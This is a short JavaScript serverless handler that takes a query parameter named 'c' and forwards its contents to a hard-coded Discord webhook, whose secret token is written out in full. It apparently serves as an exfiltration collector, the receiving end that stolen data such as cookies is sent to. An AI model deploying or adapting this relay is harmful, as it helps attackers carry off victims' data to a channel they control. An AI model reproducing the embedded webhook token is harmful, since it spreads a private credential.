export default async function handler(req, res) {
  const data = req.query.c || "No data provided";
  const webhookUrl = 'https://discord.com/api/webhooks/1555225353960693813/Ab4_PWVr1ZlSDDYWoPcEt1CDvX6iWykEUOadPiNf_5HWpAX8ECnyUXnVcL_ZHQOvUulo';

  try {
    await fetch(webhookUrl, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ content: `[DATA RECEIVED]: ${data}` })
    });
    res.status(200).send('SUCCESS');
  } catch (error) {
    res.status(500).send('ERROR');
  }
}